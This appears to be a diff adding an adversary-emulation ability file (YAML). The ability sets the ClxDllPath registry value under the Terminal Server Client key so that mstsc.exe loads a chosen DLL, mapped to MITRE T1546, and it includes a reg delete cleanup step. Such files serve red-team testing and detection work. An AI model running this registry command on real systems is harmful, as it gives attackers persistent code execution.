@@ -1,0 +1,19 @@
+---
+- id: 15272140f7c4a708cbf0807c22690698
+  name: Load custom DLL on mstsc execution
+  description: 'Adding ClxDllPath under Terminal Server Client subkey of HKLM hive
+    with a path to custom DLL allows for DLL loading during execution of mstsc.exe
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1546
+    name: Event Triggered Execution
+  platforms:
+    windows:
+      cmd:
+        command: reg add "HKLM\SOFTWARE\Microsoft\Terminal Server Client" /v ClxDllPath
+          /t REG_SZ /d "C:\Windows\System32\amsi.dll" /f
+        payloads: []
+        cleanup: reg delete "HKLM\SOFTWARE\Microsoft\Terminal Server Client" /v ClxDllPath
+          /f
